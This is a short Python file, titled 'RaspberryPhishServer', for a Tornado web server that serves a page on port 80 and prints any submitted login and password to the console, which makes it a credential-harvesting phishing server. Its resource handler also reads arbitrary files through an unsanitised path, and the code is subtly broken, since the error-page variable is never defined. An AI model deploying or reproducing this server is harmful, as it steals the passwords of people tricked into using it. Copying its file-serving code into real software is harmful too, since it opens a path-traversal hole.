#!/usr/bin/env python
# -*- coding: utf-8 -*

__title__ = "RaspberryPhishServer"

pagePath="test/test.html"
pagePath="test/test-error.html"

import tornado.ioloop
import tornado.web
import os

class RscHandler(tornado.web.RequestHandler):
    def get(self, pathRequest):
        self.write(open("./rsc/" + pathRequest, 'rb').read())


class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.render("./pages/" + pagePath)

    def post(self):
        #@TODO work with ids
        print("login > " + self.get_body_argument("login"))
        print("password > " + self.get_body_argument("password"))
        #@TODO reload the same page or an error one or something else ...
        self.render("./pages/" + pageErrorPath)


if __name__ == "__main__":
    # create an instance
    application = tornado.web.Application([
                (r'/rsc/(.*)$',RscHandler),
                (r"/", MainHandler),
            ],
        autoreload=True, debug=True )
    # bind a port
    application.listen(80)
    # wait forever for satisfy users request
    tornado.ioloop.IOLoop.instance().start()
